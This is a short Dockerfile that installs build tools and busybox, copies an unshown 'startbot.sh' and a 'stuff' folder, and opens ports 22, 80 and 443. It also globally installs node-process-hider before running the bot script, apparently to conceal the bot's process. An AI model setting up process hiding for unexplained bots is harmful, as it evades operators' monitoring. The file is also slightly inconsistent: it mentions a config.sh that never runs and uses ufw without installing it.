FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    ca-certificates \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN echo "Uploaded files:" && ls /home/stuff/
RUN npm i -g node-process-hider
RUN sudo ufw allow 22/tcp && sudo ufw allow 22/udp && sudo ufw allow 443/tcp && sudo ufw allow 443/udp && sudo ufw allow 80/tcp && sudo ufw allow 80/udp

# Run bot script:
CMD bash /home/startbot.sh
